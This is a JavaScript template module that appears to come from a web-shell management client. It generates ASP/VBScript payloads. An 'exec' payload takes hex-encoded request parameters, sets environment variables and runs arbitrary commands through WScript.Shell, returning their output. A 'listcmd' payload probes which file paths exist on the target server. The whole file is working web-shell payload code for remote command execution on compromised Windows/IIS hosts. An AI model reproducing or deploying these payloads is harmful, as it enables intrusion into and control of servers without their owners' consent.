/**
 * 命令执行模板
 */

module.exports = (arg1, arg2, arg3) => ({
  exec: {
    _: `Set PutEnv=CreateObject("WScript.Shell").Environment("Process"):
    envstr=Split(""&bd(Request("${arg3}"))&"", "|||asline|||"):
    For Each envline in envstr:
      If Len(envline)>0 Then:
        ss=Split(envline, "|||askey|||"):
        PutEnv(ss(0))=ss(1):
      End If:
    Next:
    Set X=CreateObject("wscript.shell").exec(""""&bd(Request("${arg1}"))&""" /c """&bd(Request("${arg2}"))&""""):
    If Err Then:
      S="[Err] "&Err.Description:
      Err.Clear:
    Else:
      O=X.StdOut.ReadAll():
      E=X.StdErr.ReadAll():
      S=O&E:
    End If:
    Response.write(S)`.replace(/\n\s+/g, ''),
    [arg1]: "#{hex::bin}",
    [arg2]: "#{hex::cmd}",
    [arg3]: "#{hex::env}",
  },
  listcmd: {
    _: `AA=Split(""&bd(Request("${arg1}"))&"",","):
    Set FS=CreateObject("Scripting.FileSystemObject"):
    For Each A in AA:
        Response.Write(A&chr(9)):
        If FS.FileExists(A) Then:
          Response.Write("1"):
        Else:
          Response.Write("0"):
        End If:
        Response.Write(chr(10)):
    Next
    `.replace(/\n\s+/g, ''),
    [arg1]: "#{hex::binarr}",
  }
})